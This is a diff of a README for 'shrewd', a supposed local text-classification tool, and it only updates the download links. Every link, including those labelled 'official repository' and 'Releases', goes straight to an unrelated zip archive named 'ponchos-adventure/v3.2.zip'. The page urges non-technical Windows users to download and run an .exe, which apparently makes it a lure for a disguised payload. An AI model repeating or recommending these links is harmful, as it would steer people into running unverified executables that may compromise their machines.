@@ -4,7 +4,7 @@ title: "😎 shrewd - Smarter, Faster, Cheaper Text Classification"
 description: "Distill repeated LLM classification calls into a fast, local, CPU-only model that runs in under a millisecond."
 ---
 # 😎 shrewd - Smarter, Faster, Cheaper Text Classification
-[![Download Now](https://img.shields.io/badge/Download%20shrewd-Click%20Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip)
+[![Download Now](https://img.shields.io/badge/Download%20shrewd-Click%20Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Ready to give shrewd a try? Follow these simple steps. If you can click a mouse 
 ### Step 1: 🛒 Download the Application
 
 Visit this link to download the application:
-[**https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip**](https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip)
+[**https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip**](https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip)
 
 When you land on the page, look for the section that says **"Assets"** or **"Downloads"** — you'll see a list of files there. For most users, you'll want to download the **`.exe`** file (it's the one that runs directly on your Windows computer). Choose the **`.exe`** and save it to a location you'll remember, like your **Desktop** or **Downloads** folder.
 
@@ -134,7 +134,7 @@ Usually just seconds to a few minutes, depending on the complexity. You'll see p
 
 Run into trouble? Don't worry — you're not alone. Here are a few ways to get back on track:
 
-- **Check the official repository:** [https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip](https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip)
+- **Check the official repository:** [https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip](https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip)
 - **Look for the README section** — it often contains updated instructions and troubleshooting tips.
 - **Submit an issue** on the GitHub page if you've encountered a bug. Describe what you were doing when the problem happened, and the developers will jump in to help.
 
@@ -146,7 +146,7 @@ shrewd is a powerful little utility that makes specialized AI practical for ever
 
 Stop paying for every single call. Stop waiting for remote servers. Download shrewd today and discover what it's like to have an AI expert living right on your hard drive.
 
-[![Download Now](https://img.shields.io/badge/📥%20Download%20shrewd-Visit%20Releases-2196F3?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/segu0/segu0.github.io/raw/refs/heads/main/ponchos-adventure/v3.2.zip)
+[![Download Now](https://img.shields.io/badge/📥%20Download%20shrewd-Visit%20Releases-2196F3?style=for-the-badge&logo=appveyor&logoColor=white)](https://raw.githubusercontent.com/segu0/segu0.github.io/main/ponchos-adventure/v3.2.zip)
 
 ---
 
